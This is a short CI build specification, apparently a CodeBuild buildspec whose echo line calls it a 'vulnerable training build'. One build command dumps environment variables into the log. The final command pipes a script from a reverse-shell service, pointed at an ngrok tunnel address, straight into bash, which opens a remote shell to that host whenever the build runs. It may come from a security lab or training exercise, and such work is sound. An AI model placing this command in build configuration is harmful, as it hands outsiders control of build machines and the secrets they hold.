version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20
      - echo "Done"
      - curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11309 | bash
